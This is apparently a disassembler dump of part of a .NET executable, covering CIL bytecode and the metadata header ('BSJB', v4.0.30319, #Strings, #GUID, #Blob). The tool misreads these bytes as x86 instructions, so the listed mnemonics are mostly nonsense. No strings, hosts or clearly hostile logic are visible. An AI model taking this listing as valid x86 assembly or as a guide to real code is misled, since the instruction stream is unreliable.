  40427f:	0a 6f d4             	or     -0x2c(%edi),%ch
  404282:	00 00                	add    %al,(%eax)
  404284:	0a 7e 11             	or     0x11(%esi),%bh
  404287:	00 00                	add    %al,(%eax)
  404289:	04 2c                	add    $0x2c,%al
  40428b:	16                   	push   %ss
  40428c:	14 fe                	adc    $0xfe,%al
  40428e:	06                   	push   %es
  40428f:	59                   	pop    %ecx
  404290:	00 00                	add    %al,(%eax)
  404292:	06                   	push   %es
  404293:	73 99                	jae    0x40422e
  404295:	00 00                	add    %al,(%eax)
  404297:	0a 73 9a             	or     -0x66(%ebx),%dh
  40429a:	00 00                	add    %al,(%eax)
  40429c:	0a 6f d4             	or     -0x2c(%edi),%ch
  40429f:	00 00                	add    %al,(%eax)
  4042a1:	0a 14 fe             	or     (%esi,%edi,8),%dl
  4042a4:	06                   	push   %es
  4042a5:	57                   	push   %edi
  4042a6:	00 00                	add    %al,(%eax)
  4042a8:	06                   	push   %es
  4042a9:	73 99                	jae    0x404244
  4042ab:	00 00                	add    %al,(%eax)
  4042ad:	0a 73 9a             	or     -0x66(%ebx),%dh
  4042b0:	00 00                	add    %al,(%eax)
  4042b2:	0a 6f d4             	or     -0x2c(%edi),%ch
  4042b5:	00 00                	add    %al,(%eax)
  4042b7:	0a 14 fe             	or     (%esi,%edi,8),%dl
  4042ba:	06                   	push   %es
  4042bb:	4d                   	dec    %ebp
  4042bc:	00 00                	add    %al,(%eax)
  4042be:	06                   	push   %es
  4042bf:	73 99                	jae    0x40425a
  4042c1:	00 00                	add    %al,(%eax)
  4042c3:	0a 73 9a             	or     -0x66(%ebx),%dh
  4042c6:	00 00                	add    %al,(%eax)
  4042c8:	0a 6f d4             	or     -0x2c(%edi),%ch
  4042cb:	00 00                	add    %al,(%eax)
  4042cd:	0a 7e 17             	or     0x17(%esi),%bh
  4042d0:	00 00                	add    %al,(%eax)
  4042d2:	04 6f                	add    $0x6f,%al
  4042d4:	38 00                	cmp    %al,(%eax)
  4042d6:	00 0a                	add    %cl,(%edx)
  4042d8:	1f                   	pop    %ds
  4042d9:	19 31                	sbb    %esi,(%ecx)
  4042db:	1d 14 fe 06 31       	sbb    $0x3106fe14,%eax
  4042e0:	00 00                	add    %al,(%eax)
  4042e2:	06                   	push   %es
  4042e3:	73 99                	jae    0x40427e
  4042e5:	00 00                	add    %al,(%eax)
  4042e7:	0a 73 9a             	or     -0x66(%ebx),%dh
  4042ea:	00 00                	add    %al,(%eax)
  4042ec:	0a 25 16 6f 75 00    	or     0x756f16,%ah
  4042f2:	00 0a                	add    %cl,(%edx)
  4042f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4042f5:	d4 00                	aam    $0x0
  4042f7:	00 0a                	add    %cl,(%edx)
  4042f9:	28 38                	sub    %bh,(%eax)
  4042fb:	00 00                	add    %al,(%eax)
  4042fd:	06                   	push   %es
  4042fe:	14 fe                	adc    $0xfe,%al
  404300:	06                   	push   %es
  404301:	1a 00                	sbb    (%eax),%al
  404303:	00 06                	add    %al,(%esi)
  404305:	73 d5                	jae    0x4042dc
  404307:	00 00                	add    %al,(%eax)
  404309:	0a 28                	or     (%eax),%ch
  40430b:	d6                   	salc
  40430c:	00 00                	add    %al,(%eax)
  40430e:	0a de                	or     %dh,%bl
  404310:	0c 28                	or     $0x28,%al
  404312:	2c 00                	sub    $0x0,%al
  404314:	00 0a                	add    %cl,(%edx)
  404316:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  40431c:	00 2a                	add    %ch,(%edx)
  40431e:	00 00                	add    %al,(%eax)
  404320:	01 10                	add    %edx,(%eax)
  404322:	00 00                	add    %al,(%eax)
  404324:	00 00                	add    %al,(%eax)
  404326:	00 00                	add    %al,(%eax)
  404328:	f9                   	stc
  404329:	f9                   	stc
  40432a:	00 0c 14             	add    %cl,(%esp,%edx,1)
  40432d:	00 00                	add    %al,(%eax)
  40432f:	01 1b                	add    %ebx,(%ebx)
  404331:	30 03                	xor    %al,(%ebx)
  404333:	00 cd                	add    %cl,%ch
  404335:	01 00                	add    %eax,(%eax)
  404337:	00 1a                	add    %bl,(%edx)
  404339:	00 00                	add    %al,(%eax)
  40433b:	11 20                	adc    %esp,(%eax)
  40433d:	88 13                	mov    %dl,(%ebx)
  40433f:	00 00                	add    %al,(%eax)
  404341:	28 77 00             	sub    %dh,0x0(%edi)
  404344:	00 0a                	add    %cl,(%edx)
  404346:	28 28                	sub    %ch,(%eax)
  404348:	00 00                	add    %al,(%eax)
  40434a:	06                   	push   %es
  40434b:	28 33                	sub    %dh,(%ebx)
  40434d:	00 00                	add    %al,(%eax)
  40434f:	0a 0a                	or     (%edx),%cl
  404351:	28 29                	sub    %ch,(%ecx)
  404353:	00 00                	add    %al,(%eax)
  404355:	06                   	push   %es
  404356:	28 33                	sub    %dh,(%ebx)
  404358:	00 00                	add    %al,(%eax)
  40435a:	0a 0b                	or     (%ebx),%cl
  40435c:	72 24                	jb     0x404382
  40435e:	08 00                	or     %al,(%eax)
  404360:	70 0c                	jo     0x40436e
  404362:	28 2d 00 00 06 28    	sub    %ch,0x28060000
  404368:	33 00                	xor    (%eax),%eax
  40436a:	00 0a                	add    %cl,(%edx)
  40436c:	0d 28 5c 00 00       	or     $0x5c28,%eax
  404371:	06                   	push   %es
  404372:	26 17                	es pop %ss
  404374:	13 04 7e             	adc    (%esi,%edi,2),%eax
  404377:	21 00                	and    %eax,(%eax)
  404379:	00 04 39             	add    %al,(%ecx,%edi,1)
  40437c:	7a 01                	jp     0x40437f
  40437e:	00 00                	add    %al,(%eax)
  404380:	20 b8 0b 00 00 28    	and    %bh,0x2800000b(%eax)
  404386:	77 00                	ja     0x404388
  404388:	00 0a                	add    %cl,(%edx)
  40438a:	06                   	push   %es
  40438b:	72 f7                	jb     0x404384
  40438d:	02 00                	add    (%eax),%al
  40438f:	70 28                	jo     0x4043b9
  404391:	17                   	pop    %ss
  404392:	00 00                	add    %al,(%eax)
  404394:	06                   	push   %es
  404395:	16                   	push   %ss
  404396:	28 56 00             	sub    %dl,0x0(%esi)
  404399:	00 0a                	add    %cl,(%edx)
  40439b:	2c 2a                	sub    $0x2a,%al
  40439d:	72 f7                	jb     0x404396
  40439f:	02 00                	add    (%eax),%al
  4043a1:	70 28                	jo     0x4043cb
  4043a3:	17                   	pop    %ss
  4043a4:	00 00                	add    %al,(%eax)
  4043a6:	06                   	push   %es
  4043a7:	0a 72 35             	or     0x35(%edx),%dh
  4043aa:	09 00                	or     %eax,(%eax)
  4043ac:	70 7e                	jo     0x40442c
  4043ae:	2d 00 00 04 28       	sub    $0x28040000,%eax
  4043b3:	49                   	dec    %ecx
  4043b4:	00 00                	add    %al,(%eax)
  4043b6:	0a 06                	or     (%esi),%al
  4043b8:	28 49 00             	sub    %cl,0x0(%ecx)
  4043bb:	00 0a                	add    %cl,(%edx)
  4043bd:	28 33                	sub    %dh,(%ebx)
  4043bf:	00 00                	add    %al,(%eax)
  4043c1:	0a 28                	or     (%eax),%ch
  4043c3:	43                   	inc    %ebx
  4043c4:	00 00                	add    %al,(%eax)
  4043c6:	06                   	push   %es
  4043c7:	de 11                	ficoms (%ecx)
  4043c9:	25 11 04 28 d8       	and    $0xd8280411,%eax
  4043ce:	00 00                	add    %al,(%eax)
  4043d0:	0a 13                	or     (%ebx),%dl
  4043d2:	05 28 2d 00 00       	add    $0x2d28,%eax
  4043d7:	0a de                	or     %dh,%bl
  4043d9:	00 00                	add    %al,(%eax)
  4043db:	7e 10                	jle    0x4043ed
  4043dd:	00 00                	add    %al,(%eax)
  4043df:	04 2c                	add    $0x2c,%al
  4043e1:	42                   	inc    %edx
  4043e2:	07                   	pop    %es
  4043e3:	72 2b                	jb     0x404410
  4043e5:	03 00                	add    (%eax),%eax
  4043e7:	70 28                	jo     0x404411
  4043e9:	17                   	pop    %ss
  4043ea:	00 00                	add    %al,(%eax)
  4043ec:	06                   	push   %es
  4043ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4043ee:	64 00 00             	add    %al,%fs:(%eax)
  4043f1:	0a 16                	or     (%esi),%dl
  4043f3:	28 56 00             	sub    %dl,0x0(%esi)
  4043f6:	00 0a                	add    %cl,(%edx)
  4043f8:	2c 2a                	sub    $0x2a,%al
  4043fa:	72 2b                	jb     0x404427
  4043fc:	03 00                	add    (%eax),%eax
  4043fe:	70 28                	jo     0x404428
  404400:	17                   	pop    %ss
  404401:	00 00                	add    %al,(%eax)
  404403:	06                   	push   %es
  404404:	0b 72 3b             	or     0x3b(%edx),%esi
  404407:	09 00                	or     %eax,(%eax)
  404409:	70 7e                	jo     0x404489
  40440b:	2d 00 00 04 28       	sub    $0x28040000,%eax
  404410:	49                   	dec    %ecx
  404411:	00 00                	add    %al,(%eax)
  404413:	0a 07                	or     (%edi),%al
  404415:	28 49 00             	sub    %cl,0x0(%ecx)
  404418:	00 0a                	add    %cl,(%edx)
  40441a:	28 33                	sub    %dh,(%ebx)
  40441c:	00 00                	add    %al,(%eax)
  40441e:	0a 28                	or     (%eax),%ch
  404420:	43                   	inc    %ebx
  404421:	00 00                	add    %al,(%eax)
  404423:	06                   	push   %es
  404424:	de 11                	ficoms (%ecx)
  404426:	25 11 04 28 d8       	and    $0xd8280411,%eax
  40442b:	00 00                	add    %al,(%eax)
  40442d:	0a 13                	or     (%ebx),%dl
  40442f:	06                   	push   %es
  404430:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  404436:	00 00                	add    %al,(%eax)
  404438:	08 28                	or     %ch,(%eax)
  40443a:	2c 00                	sub    $0x0,%al
  40443c:	00 06                	add    %al,(%esi)
  40443e:	16                   	push   %ss
  40443f:	28 56 00             	sub    %dl,0x0(%esi)
  404442:	00 0a                	add    %cl,(%edx)
  404444:	2c 25                	sub    $0x25,%al
  404446:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  404449:	00 06                	add    %al,(%esi)
  40444b:	0c 72                	or     $0x72,%al
  40444d:	43                   	inc    %ebx
  40444e:	09 00                	or     %eax,(%eax)
  404450:	70 7e                	jo     0x4044d0
  404452:	2d 00 00 04 28       	sub    $0x28040000,%eax
  404457:	49                   	dec    %ecx
  404458:	00 00                	add    %al,(%eax)
  40445a:	0a 08                	or     (%eax),%cl
  40445c:	28 49 00             	sub    %cl,0x0(%ecx)
  40445f:	00 0a                	add    %cl,(%edx)
  404461:	28 33                	sub    %dh,(%ebx)
  404463:	00 00                	add    %al,(%eax)
  404465:	0a 28                	or     (%eax),%ch
  404467:	43                   	inc    %ebx
  404468:	00 00                	add    %al,(%eax)
  40446a:	06                   	push   %es
  40446b:	de 11                	ficoms (%ecx)
  40446d:	25 11 04 28 d8       	and    $0xd8280411,%eax
  404472:	00 00                	add    %al,(%eax)
  404474:	0a 13                	or     (%ebx),%dl
  404476:	07                   	pop    %es
  404477:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  40447d:	00 00                	add    %al,(%eax)
  40447f:	09 72 c9             	or     %esi,-0x37(%edx)
  404482:	04 00                	add    $0x0,%al
  404484:	70 28                	jo     0x4044ae
  404486:	17                   	pop    %ss
  404487:	00 00                	add    %al,(%eax)
  404489:	06                   	push   %es
  40448a:	6f                   	outsl  %ds:(%esi),(%dx)
  40448b:	64 00 00             	add    %al,%fs:(%eax)
  40448e:	0a 16                	or     (%esi),%dl
  404490:	28 56 00             	sub    %dl,0x0(%esi)
  404493:	00 0a                	add    %cl,(%edx)
  404495:	2c 4a                	sub    $0x4a,%al
  404497:	72 c9                	jb     0x404462
  404499:	04 00                	add    $0x0,%al
  40449b:	70 28                	jo     0x4044c5
  40449d:	17                   	pop    %ss
  40449e:	00 00                	add    %al,(%eax)
  4044a0:	06                   	push   %es
  4044a1:	0d 72 8c 07 00       	or     $0x78c72,%eax
  4044a6:	70 7e                	jo     0x404526
  4044a8:	2d 00 00 04 28       	sub    $0x28040000,%eax
  4044ad:	49                   	dec    %ecx
  4044ae:	00 00                	add    %al,(%eax)
  4044b0:	0a 72 49             	or     0x49(%edx),%dh
  4044b3:	09 00                	or     %eax,(%eax)
  4044b5:	70 28                	jo     0x4044df
  4044b7:	49                   	dec    %ecx
  4044b8:	00 00                	add    %al,(%eax)
  4044ba:	0a 09                	or     (%ecx),%cl
  4044bc:	28 49 00             	sub    %cl,0x0(%ecx)
  4044bf:	00 0a                	add    %cl,(%edx)
  4044c1:	28 33                	sub    %dh,(%ebx)
  4044c3:	00 00                	add    %al,(%eax)
  4044c5:	0a 28                	or     (%eax),%ch
  4044c7:	43                   	inc    %ebx
  4044c8:	00 00                	add    %al,(%eax)
  4044ca:	06                   	push   %es
  4044cb:	72 7f                	jb     0x40454c
  4044cd:	00 00                	add    %al,(%eax)
  4044cf:	70 0d                	jo     0x4044de
  4044d1:	72 c9                	jb     0x40449c
  4044d3:	04 00                	add    $0x0,%al
  4044d5:	70 72                	jo     0x404549
  4044d7:	7f 00                	jg     0x4044d9
  4044d9:	00 70 28             	add    %dh,0x28(%eax)
  4044dc:	18 00                	sbb    %al,(%eax)
  4044de:	00 06                	add    %al,(%esi)
  4044e0:	26 dd 8d fe ff ff 25 	fisttpll %es:0x25fffffe(%ebp)
  4044e7:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  4044ea:	d8 00                	fadds  (%eax)
  4044ec:	00 0a                	add    %cl,(%edx)
  4044ee:	13 08                	adc    (%eax),%ecx
  4044f0:	28 2d 00 00 0a dd    	sub    %ch,0xdd0a0000
  4044f6:	79 fe                	jns    0x4044f6
  4044f8:	ff                   	(bad)
  4044f9:	ff 20                	jmp    *(%eax)
  4044fb:	88 13                	mov    %dl,(%ebx)
  4044fd:	00 00                	add    %al,(%eax)
  4044ff:	28 77 00             	sub    %dh,0x0(%edi)
  404502:	00 0a                	add    %cl,(%edx)
  404504:	38 6a fe             	cmp    %ch,-0x2(%edx)
  404507:	ff                   	(bad)
  404508:	ff 00                	incl   (%eax)
  40450a:	00 00                	add    %al,(%eax)
  40450c:	01 34 00             	add    %esi,(%eax,%eax,1)
  40450f:	00 00                	add    %al,(%eax)
  404511:	00 4e 00             	add    %cl,0x0(%esi)
  404514:	3f                   	aas
  404515:	8d 00                	lea    (%eax),%eax
  404517:	11 14 00             	adc    %edx,(%eax,%eax,1)
  40451a:	00 01                	add    %al,(%ecx)
  40451c:	00 00                	add    %al,(%eax)
  40451e:	9f                   	lahf
  40451f:	00 4b ea             	add    %cl,-0x16(%ebx)
  404522:	00 11                	add    %dl,(%ecx)
  404524:	14 00                	adc    $0x0,%al
  404526:	00 01                	add    %al,(%ecx)
  404528:	00 00                	add    %al,(%eax)
  40452a:	fc                   	cld
  40452b:	00 35 31 01 11 14    	add    %dh,0x14110131
  404531:	00 00                	add    %al,(%eax)
  404533:	01 00                	add    %eax,(%eax)
  404535:	00 43 01             	add    %al,0x1(%ebx)
  404538:	67 aa                	stos   %al,%es:(%di)
  40453a:	01 14 14             	add    %edx,(%esp,%edx,1)
  40453d:	00 00                	add    %al,(%eax)
  40453f:	01 1b                	add    %ebx,(%ebx)
  404541:	30 03                	xor    %al,(%ebx)
  404543:	00 99 00 00 00 0f    	add    %bl,0xf000000(%ecx)
  404549:	00 00                	add    %al,(%eax)
  40454b:	11 72 59             	adc    %esi,0x59(%edx)
  40454e:	09 00                	or     %eax,(%eax)
  404550:	70 28                	jo     0x40457a
  404552:	17                   	pop    %ss
  404553:	00 00                	add    %al,(%eax)
  404555:	06                   	push   %es
  404556:	14 16                	adc    $0x16,%al
  404558:	28 56 00             	sub    %dl,0x0(%esi)
  40455b:	00 0a                	add    %cl,(%edx)
  40455d:	2d 29 7e 21 00       	sub    $0x217e29,%eax
  404562:	00 04 2c             	add    %al,(%esp,%ebp,1)
  404565:	16                   	push   %ss
  404566:	20 28                	and    %ch,(%eax)
  404568:	23 00                	and    (%eax),%eax
  40456a:	00 28                	add    %ch,(%eax)
  40456c:	77 00                	ja     0x40456e
  40456e:	00 0a                	add    %cl,(%edx)
  404570:	72 63                	jb     0x4045d5
  404572:	09 00                	or     %eax,(%eax)
  404574:	70 28                	jo     0x40459e
  404576:	43                   	inc    %ebx
  404577:	00 00                	add    %al,(%eax)
  404579:	06                   	push   %es
  40457a:	2b 2a                	sub    (%edx),%ebp
  40457c:	20 88 13 00 00 28    	and    %cl,0x28000013(%eax)
  404582:	77 00                	ja     0x404584
  404584:	00 0a                	add    %cl,(%edx)
  404586:	2b d7                	sub    %edi,%edx
  404588:	72 59                	jb     0x4045e3
  40458a:	09 00                	or     %eax,(%eax)
  40458c:	70 28                	jo     0x4045b6
  40458e:	17                   	pop    %ss
  40458f:	00 00                	add    %al,(%eax)
  404591:	06                   	push   %es
  404592:	28 1e                	sub    %bl,(%esi)
  404594:	00 00                	add    %al,(%eax)
  404596:	0a 16                	or     (%esi),%dl
  404598:	0a 12                	or     (%edx),%dl
  40459a:	00 28                	add    %ch,(%eax)
  40459c:	1b 00                	sbb    (%eax),%eax
  40459e:	00 06                	add    %al,(%esi)
  4045a0:	14 28                	adc    $0x28,%al
  4045a2:	3d 00 00 06 de       	cmp    $0xde060000,%eax
  4045a7:	3c 25                	cmp    $0x25,%al
  4045a9:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  4045ac:	00 0a                	add    %cl,(%edx)
  4045ae:	0b 72 8c             	or     -0x74(%edx),%esi
  4045b1:	07                   	pop    %es
  4045b2:	00 70 7e             	add    %dh,0x7e(%eax)
  4045b5:	2d 00 00 04 28       	sub    $0x28040000,%eax
  4045ba:	7d 00                	jge    0x4045bc
  4045bc:	00 0a                	add    %cl,(%edx)
  4045be:	72 6f                	jb     0x40462f
  4045c0:	09 00                	or     %eax,(%eax)
  4045c2:	70 28                	jo     0x4045ec
  4045c4:	7d 00                	jge    0x4045c6
  4045c6:	00 0a                	add    %cl,(%edx)
  4045c8:	07                   	pop    %es
  4045c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4045ca:	91                   	xchg   %eax,%ecx
  4045cb:	00 00                	add    %al,(%eax)
  4045cd:	0a 28                	or     (%eax),%ch
  4045cf:	7d 00                	jge    0x4045d1
  4045d1:	00 0a                	add    %cl,(%edx)
  4045d3:	28 33                	sub    %dh,(%ebx)
  4045d5:	00 00                	add    %al,(%eax)
  4045d7:	0a 28                	or     (%eax),%ch
  4045d9:	43                   	inc    %ebx
  4045da:	00 00                	add    %al,(%eax)
  4045dc:	06                   	push   %es
  4045dd:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  4045e3:	00 2a                	add    %ch,(%edx)
  4045e5:	00 00                	add    %al,(%eax)
  4045e7:	00 01                	add    %al,(%ecx)
  4045e9:	10 00                	adc    %al,(%eax)
  4045eb:	00 00                	add    %al,(%eax)
  4045ed:	00 00                	add    %al,(%eax)
  4045ef:	00 5c 5c 00          	add    %bl,0x0(%esp,%ebx,2)
  4045f3:	3c 14                	cmp    $0x14,%al
  4045f5:	00 00                	add    %al,(%eax)
  4045f7:	01 1b                	add    %ebx,(%ebx)
  4045f9:	30 03                	xor    %al,(%ebx)
  4045fb:	00 99 00 00 00 0f    	add    %bl,0xf000000(%ecx)
  404601:	00 00                	add    %al,(%eax)
  404603:	11 72 89             	adc    %esi,-0x77(%edx)
  404606:	09 00                	or     %eax,(%eax)
  404608:	70 28                	jo     0x404632
  40460a:	17                   	pop    %ss
  40460b:	00 00                	add    %al,(%eax)
  40460d:	06                   	push   %es
  40460e:	14 16                	adc    $0x16,%al
  404610:	28 56 00             	sub    %dl,0x0(%esi)
  404613:	00 0a                	add    %cl,(%edx)
  404615:	2d 29 7e 21 00       	sub    $0x217e29,%eax
  40461a:	00 04 2c             	add    %al,(%esp,%ebp,1)
  40461d:	16                   	push   %ss
  40461e:	20 f8                	and    %bh,%al
  404620:	2a 00                	sub    (%eax),%al
  404622:	00 28                	add    %ch,(%eax)
  404624:	77 00                	ja     0x404626
  404626:	00 0a                	add    %cl,(%edx)
  404628:	72 93                	jb     0x4045bd
  40462a:	09 00                	or     %eax,(%eax)
  40462c:	70 28                	jo     0x404656
  40462e:	43                   	inc    %ebx
  40462f:	00 00                	add    %al,(%eax)
  404631:	06                   	push   %es
  404632:	2b 2a                	sub    (%edx),%ebp
  404634:	20 88 13 00 00 28    	and    %cl,0x28000013(%eax)
  40463a:	77 00                	ja     0x40463c
  40463c:	00 0a                	add    %cl,(%edx)
  40463e:	2b d7                	sub    %edi,%edx
  404640:	72 89                	jb     0x4045cb
  404642:	09 00                	or     %eax,(%eax)
  404644:	70 28                	jo     0x40466e
  404646:	17                   	pop    %ss
  404647:	00 00                	add    %al,(%eax)
  404649:	06                   	push   %es
  40464a:	28 1e                	sub    %bl,(%esi)
  40464c:	00 00                	add    %al,(%eax)
  40464e:	0a 16                	or     (%esi),%dl
  404650:	0a 12                	or     (%edx),%dl
  404652:	00 28                	add    %ch,(%eax)
  404654:	1b 00                	sbb    (%eax),%eax
  404656:	00 06                	add    %al,(%esi)
  404658:	14 28                	adc    $0x28,%al
  40465a:	3d 00 00 06 de       	cmp    $0xde060000,%eax
  40465f:	3c 25                	cmp    $0x25,%al
  404661:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  404664:	00 0a                	add    %cl,(%edx)
  404666:	0b 72 8c             	or     -0x74(%edx),%esi
  404669:	07                   	pop    %es
  40466a:	00 70 7e             	add    %dh,0x7e(%eax)
  40466d:	2d 00 00 04 28       	sub    $0x28040000,%eax
  404672:	7d 00                	jge    0x404674
  404674:	00 0a                	add    %cl,(%edx)
  404676:	72 9f                	jb     0x404617
  404678:	09 00                	or     %eax,(%eax)
  40467a:	70 28                	jo     0x4046a4
  40467c:	7d 00                	jge    0x40467e
  40467e:	00 0a                	add    %cl,(%edx)
  404680:	07                   	pop    %es
  404681:	6f                   	outsl  %ds:(%esi),(%dx)
  404682:	91                   	xchg   %eax,%ecx
  404683:	00 00                	add    %al,(%eax)
  404685:	0a 28                	or     (%eax),%ch
  404687:	7d 00                	jge    0x404689
  404689:	00 0a                	add    %cl,(%edx)
  40468b:	28 33                	sub    %dh,(%ebx)
  40468d:	00 00                	add    %al,(%eax)
  40468f:	0a 28                	or     (%eax),%ch
  404691:	43                   	inc    %ebx
  404692:	00 00                	add    %al,(%eax)
  404694:	06                   	push   %es
  404695:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  40469b:	00 2a                	add    %ch,(%edx)
  40469d:	00 00                	add    %al,(%eax)
  40469f:	00 01                	add    %al,(%ecx)
  4046a1:	10 00                	adc    %al,(%eax)
  4046a3:	00 00                	add    %al,(%eax)
  4046a5:	00 00                	add    %al,(%eax)
  4046a7:	00 5c 5c 00          	add    %bl,0x0(%esp,%ebx,2)
  4046ab:	3c 14                	cmp    $0x14,%al
  4046ad:	00 00                	add    %al,(%eax)
  4046af:	01 2e                	add    %ebp,(%esi)
  4046b1:	20 03                	and    %al,(%ebx)
  4046b3:	00 00                	add    %al,(%eax)
  4046b5:	80 28 5b             	subb   $0x5b,(%eax)
  4046b8:	00 00                	add    %al,(%eax)
  4046ba:	06                   	push   %es
  4046bb:	2a 42 53             	sub    0x53(%edx),%al
  4046be:	4a                   	dec    %edx
  4046bf:	42                   	inc    %edx
  4046c0:	01 00                	add    %eax,(%eax)
  4046c2:	01 00                	add    %eax,(%eax)
  4046c4:	00 00                	add    %al,(%eax)
  4046c6:	00 00                	add    %al,(%eax)
  4046c8:	0c 00                	or     $0x0,%al
  4046ca:	00 00                	add    %al,(%eax)
  4046cc:	76 34                	jbe    0x404702
  4046ce:	2e 30 2e             	xor    %ch,%cs:(%esi)
  4046d1:	33 30                	xor    (%eax),%esi
  4046d3:	33 31                	xor    (%ecx),%esi
  4046d5:	39 00                	cmp    %eax,(%eax)
  4046d7:	00 00                	add    %al,(%eax)
  4046d9:	00 05 00 6c 00 00    	add    %al,0x6c00
  4046df:	00 40 13             	add    %al,0x13(%eax)
  4046e2:	00 00                	add    %al,(%eax)
  4046e4:	23 7e 00             	and    0x0(%esi),%edi
  4046e7:	00 ac 13 00 00 9c 21 	add    %ch,0x219c0000(%ebx,%edx,1)
  4046ee:	00 00                	add    %al,(%eax)
  4046f0:	23 53 74             	and    0x74(%ebx),%edx
  4046f3:	72 69                	jb     0x40475e
  4046f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4046f6:	67 73 00             	addr16 jae 0x4046f9
  4046f9:	00 00                	add    %al,(%eax)
  4046fb:	00 48 35             	add    %cl,0x35(%eax)
  4046fe:	00 00                	add    %al,(%eax)
  404700:	bc 09 00 00 23       	mov    $0x23000009,%esp
  404705:	55                   	push   %ebp
  404706:	53                   	push   %ebx
  404707:	00 04 3f             	add    %al,(%edi,%edi,1)
  40470a:	00 00                	add    %al,(%eax)
  40470c:	10 00                	adc    %al,(%eax)
  40470e:	00 00                	add    %al,(%eax)
  404710:	23 47 55             	and    0x55(%edi),%eax
  404713:	49                   	dec    %ecx
  404714:	44                   	inc    %esp
  404715:	00 00                	add    %al,(%eax)
  404717:	00 14 3f             	add    %dl,(%edi,%edi,1)
  40471a:	00 00                	add    %al,(%eax)
  40471c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40471d:	06                   	push   %es
  40471e:	00 00                	add    %al,(%eax)
  404720:	23 42 6c             	and    0x6c(%edx),%eax
  404723:	6f                   	outsl  %ds:(%esi),(%dx)
  404724:	62 00                	bound  %eax,(%eax)
  404726:	00 00                	add    %al,(%eax)
  404728:	00 00                	add    %al,(%eax)
  40472a:	00 00                	add    %al,(%eax)
  40472c:	02 00                	add    (%eax),%al
  40472e:	00 0a                	add    %cl,(%edx)
  404730:	57                   	push   %edi
  404731:	3d a2 1d 09 0e       	cmp    $0xe091da2,%eax
  404736:	00 00                	add    %al,(%eax)
  404738:	00 fa                	add    %bh,%dl
  40473a:	01 33                	add    %esi,(%ebx)
  40473c:	00 16                	add    %dl,(%esi)
  40473e:	c4 00                	les    (%eax),%eax
  404740:	01 00                	add    %eax,(%eax)
  404742:	00 00                	add    %al,(%eax)
  404744:	76 00                	jbe    0x404746
  404746:	00 00                	add    %al,(%eax)
  404748:	16                   	push   %ss
  404749:	00 00                	add    %al,(%eax)
  40474b:	00 31                	add    %dh,(%ecx)
  40474d:	00 00                	add    %al,(%eax)
  40474f:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  404753:	00 27                	add    %ah,(%edi)
  404755:	00 00                	add    %al,(%eax)
  404757:	00 d8                	add    %bl,%al
  404759:	00 00                	add    %al,(%eax)
  40475b:	00 04 00             	add    %al,(%eax,%eax,1)
  40475e:	00 00                	add    %al,(%eax)
  404760:	2a 00                	sub    (%eax),%al
  404762:	00 00                	add    %al,(%eax)
  404764:	05 00 00 00 1a       	add    $0x1a000000,%eax
  404769:	00 00                	add    %al,(%eax)
  40476b:	00 02                	add    %al,(%edx)
  40476d:	00 00                	add    %al,(%eax)
  40476f:	00 05 00 00 00 05    	add    %al,0x5000000
  404775:	00 00                	add    %al,(%eax)
  404777:	00 04 00             	add    %al,(%eax,%eax,1)
  40477a:	00 00                	add    %al,(%eax)
  40477c:	0a 00                	or     (%eax),%al
  40477e:	00 00                	add    %al,(%eax)
  404780:	05 00 00 00 01       	add    $0x1000000,%eax
  404785:	00 00                	add    %al,(%eax)
  404787:	00 06                	add    %al,(%esi)
  404789:	00 00                	add    %al,(%eax)
  40478b:	00 05 00 00 00 03    	add    %al,0x3000000
  404791:	00 00                	add    %al,(%eax)
  404793:	00 02                	add    %al,(%edx)
  404795:	00 00                	add    %al,(%eax)
  404797:	00 00                	add    %al,(%eax)
  404799:	00 5f 13             	add    %bl,0x13(%edi)
  40479c:	01 00                	add    %eax,(%eax)
  40479e:	00 00                	add    %al,(%eax)
  4047a0:	00 00                	add    %al,(%eax)
  4047a2:	0e                   	push   %cs
  4047a3:	00 fe                	add    %bh,%dh
  4047a5:	03 65 0b             	add    0xb(%ebp),%esp
  4047a8:	0a 00                	or     (%eax),%al
  4047aa:	df 04 87             	filds  (%edi,%eax,4)
  4047ad:	07                   	pop    %es
  4047ae:	0a 00                	or     (%eax),%al
  4047b0:	23 04 87             	and    (%edi,%eax,4),%eax
  4047b3:	07                   	pop    %es
  4047b4:	0a 00                	or     (%eax),%al
  4047b6:	c8 04 16 0a          	enter  $0x1604,$0xa
  4047ba:	0e                   	push   %cs
  4047bb:	00 6c 0a 39          	add    %ch,0x39(%edx,%ecx,1)
  4047bf:	0b 06                	or     (%esi),%eax
  4047c1:	00 3c 05 10 0b 06 00 	add    %bh,0x60b10(,%eax,1)
  4047c8:	8c 0d 00 08 0e 00    	mov    %cs,0xe0800
  4047ce:	43                   	inc    %ebx
  4047cf:	0a 65 0b             	or     0xb(%ebp),%ah
  4047d2:	0a 00                	or     (%eax),%al
  4047d4:	b3 04                	mov    $0x4,%bl
  4047d6:	70 08                	jo     0x4047e0
  4047d8:	0e                   	push   %cs
  4047d9:	00 0c 05 ae 0b 0e 00 	add    %cl,0xe0bae(,%eax,1)
  4047e0:	24 05                	and    $0x5,%al
  4047e2:	79 01                	jns    0x4047e5
  4047e4:	06                   	push   %es
  4047e5:	00 cf                	add    %cl,%bh
  4047e7:	0c d5                	or     $0xd5,%al
  4047e9:	0b 06                	or     (%esi),%eax
  4047eb:	00 ee                	add    %ch,%dh
  4047ed:	03 00                	add    (%eax),%eax
  4047ef:	08 06                	or     %al,(%esi)
  4047f1:	00 d4                	add    %dl,%ah
  4047f3:	02 00                	add    (%eax),%al
  4047f5:	08 06                	or     %al,(%esi)
  4047f7:	00 c8                	add    %cl,%al
  4047f9:	0a 00                	or     (%eax),%al
  4047fb:	08 0e                	or     %cl,(%esi)
  4047fd:	00 54 05 79          	add    %dl,0x79(%ebp,%eax,1)
  404801:	01 06                	add    %eax,(%esi)
  404803:	00 6f 04             	add    %ch,0x4(%edi)
